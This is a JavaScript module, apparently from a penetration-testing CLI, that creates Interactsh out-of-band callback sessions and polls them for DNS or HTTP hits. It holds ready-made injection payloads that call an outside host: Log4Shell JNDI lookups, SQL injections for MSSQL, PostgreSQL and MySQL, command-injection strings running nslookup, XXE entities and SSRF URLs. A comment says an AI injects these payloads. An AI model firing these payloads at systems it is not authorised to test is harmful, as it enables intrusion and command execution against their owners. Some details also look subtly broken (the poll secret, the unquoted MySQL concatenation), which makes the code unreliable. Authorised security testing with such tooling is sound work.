/**
 * Interactsh OOB (Out-of-Band) Client
 * Generates unique callback URLs and polls for interactions.
 * Used for blind vulnerability detection: SQLi, CMDi, XXE, SSRF, Log4Shell.
 */
import { randomBytes, createHash } from 'crypto';

const DEFAULT_SERVER = 'oast.pro';

/**
 * Generate a unique correlation ID for tracking OOB callbacks.
 */
function generateCorrelationId() {
  return randomBytes(16).toString('hex').slice(0, 20);
}

/**
 * Create an Interactsh session — generates a subdomain for OOB callbacks.
 * @param {object} opts - { server?: string }
 * @returns {{ id: string, url: string, dnsHost: string, httpUrl: string, payloads: object }}
 */
export function createOobSession(opts = {}) {
  const server = opts.server || DEFAULT_SERVER;
  const id = generateCorrelationId();
  const subdomain = `${id}.${server}`;

  return {
    id,
    server,
    subdomain,
    dnsHost: subdomain,
    httpUrl: `http://${subdomain}`,
    httpsUrl: `https://${subdomain}`,
    // Pre-built payloads for common blind vuln classes
    payloads: {
      log4shell: `\${jndi:ldap://${subdomain}/a}`,
      log4shell_dns: `\${jndi:dns://${subdomain}}`,
      blind_sqli_mssql: `'; EXEC master..xp_dirtree '//${subdomain}/a'--`,
      blind_sqli_postgres: `'; COPY (SELECT '') TO PROGRAM 'nslookup ${subdomain}'--`,
      blind_sqli_mysql: `' AND LOAD_FILE(CONCAT('\\\\\\\\',${subdomain},'\\\\a'))-- `,
      blind_cmdi_linux: `; nslookup ${subdomain}`,
      blind_cmdi_windows: `& nslookup ${subdomain}`,
      blind_cmdi_backtick: '`nslookup ' + subdomain + '`',
      xxe_external: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://${subdomain}/xxe">]>`,
      xxe_parameter: `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://${subdomain}/xxe"> %xxe;]>`,
      ssrf: `http://${subdomain}/ssrf`,
      ssrf_dns: subdomain,
      java_deserialization: subdomain, // Used in URLDNS gadget
    }
  };
}

/**
 * Poll Interactsh server for interactions (DNS/HTTP callbacks).
 * @param {object} session - from createOobSession()
 * @param {object} opts - { timeout?: number, interval?: number }
 * @returns {Promise<{ interactions: Array, found: boolean }>}
 */
export async function pollInteractions(session, opts = {}) {
  const timeout = opts.timeout || 30000;
  const interval = opts.interval || 5000;
  const startTime = Date.now();
  const interactions = [];

  // Poll the Interactsh API for callbacks
  const pollUrl = `https://${session.server}/poll?id=${session.id}&secret=${session.id}`;

  while (Date.now() - startTime < timeout) {
    try {
      const response = await fetch(pollUrl, {
        headers: { 'User-Agent': 'RedCLI-OOB/1.0' }
      });

      if (response.ok) {
        const data = await response.json();
        if (data && data.data && data.data.length > 0) {
          for (const entry of data.data) {
            interactions.push({
              type: entry.protocol || 'dns',
              timestamp: entry.timestamp || new Date().toISOString(),
              remoteAddress: entry['remote-address'] || 'unknown',
              rawRequest: entry['raw-request'] || '',
              rawResponse: entry['raw-response'] || ''
            });
          }
          return { interactions, found: true, elapsed: Date.now() - startTime };
        }
      }
    } catch {
      // Server might not support polling API — use DNS-based detection
    }

    await new Promise(r => setTimeout(r, interval));
  }

  return { interactions, found: false, elapsed: timeout };
}

/**
 * Quick OOB test — create session, return payloads, and a poll function.
 * The AI uses this to inject payloads and then check for callbacks.
 */
export function startOobListener(opts = {}) {
  const session = createOobSession(opts);

  return {
    ...session,
    poll: (pollOpts) => pollInteractions(session, pollOpts),
    summary: `OOB listener started: ${session.subdomain}\nInject payloads and then call poll() to check for callbacks.`
  };
}

export default { createOobSession, pollInteractions, startOobListener };
